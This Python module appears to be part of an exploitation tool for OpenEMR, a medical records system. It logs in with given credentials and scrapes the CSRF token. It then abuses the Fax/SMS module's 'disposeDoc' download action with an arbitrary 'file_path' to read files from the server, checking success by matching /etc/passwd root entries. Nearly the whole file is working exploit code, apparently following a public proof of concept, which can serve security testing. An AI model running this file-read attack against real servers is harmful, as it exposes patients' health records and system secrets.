#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
from typing import Optional, Tuple


FAXSMS_PATH = "/interface/modules/custom_modules/oe-module-faxsms/index.php"
LOGIN_PATH = "/interface/login/login.php"
MAIN_PATH = "/interface/main/main_screen.php"
FAIL_MARKER = "login_screen.php?error=1"
ACTIONS = ("disposeDoc", "disposeDocument")

_CSRF_RE = re.compile(r"csrf_token_form.*?value=([\"'])(.*?)\1", re.I | re.S)
_PASSWD_RE = re.compile(r"^root:[x*!]:0:0:", re.M)


def normalize_openemr_base_path(base_path: str) -> str:
    """Return a clean OpenEMR base path with no trailing slash, except root."""
    base = (base_path or "/").strip()
    if not base.startswith("/"):
        base = "/" + base
    return base.rstrip("/") or ""


def openemr_path(base_path: str, suffix: str) -> str:
    suffix = "/" + str(suffix or "").lstrip("/")
    return f"{normalize_openemr_base_path(base_path)}{suffix}" or "/"


def looks_like_openemr_login(body: str) -> bool:
    if not body:
        return False
    low = body.lower()
    return "openemr" in low and ("authuser" in low or "login" in low)


def looks_like_etc_passwd(body: str) -> bool:
    return bool(body and _PASSWD_RE.search(body))


def openemr_login(http, base_path: str, site: str, username: str, password: str):
    """
    Prime an OpenEMR session and submit the standard login form.

    The vulnerable action itself is used later to confirm whether the session is
    accepted, matching the public PoC behaviour.
    """
    site = (site or "default").strip() or "default"
    login = http.http_request(
        method="GET",
        path=openemr_path(base_path, LOGIN_PATH),
        params={"site": site},
        allow_redirects=True,
        timeout=max(int(http.timeout or 10), 15),
    )

    data = {
        "new_login_session_management": "1",
        "authProvider": "Default",
        "authUser": username,
        "clearPass": password,
        "languageChoice": "1",
    }

    m = _CSRF_RE.search(login.text or "") if login else None
    if m:
        data["csrf_token_form"] = m.group(2)

    return http.http_request(
        method="POST",
        path=openemr_path(base_path, MAIN_PATH),
        params={"auth": "login", "site": site},
        data=data,
        allow_redirects=True,
        timeout=max(int(http.timeout or 10), 15),
    )


def openemr_read_file(
    http,
    base_path: str,
    site: str,
    remote_path: str,
    *,
    timeout: Optional[int] = None,
) -> Tuple[Optional[str], str, Optional[str]]:
    """
    Try the vulnerable Fax/SMS download actions.

    Returns ``(content, status, action)`` where status is one of:
    ``ok``, ``session`` or ``missing``.
    """
    site = (site or "default").strip() or "default"
    target = (remote_path or "").strip()
    if not target:
        return None, "missing", None

    req_timeout = timeout if timeout is not None else max(int(http.timeout or 10), 15)
    for action in ACTIONS:
        resp = http.http_request(
            method="GET",
            path=openemr_path(base_path, FAXSMS_PATH),
            params={
                "site": site,
                "type": "fax",
                "_ACTION_COMMAND": action,
                "file_path": target,
                "action": "download",
            },
            allow_redirects=False,
            timeout=req_timeout,
        )
        body = resp.text if resp is not None else ""
        if FAIL_MARKER in body:
            return None, "session", action
        if "Problem with download" in body:
            return None, "missing", action
        if body and body.strip():
            return body, "ok", action

    return None, "missing", None
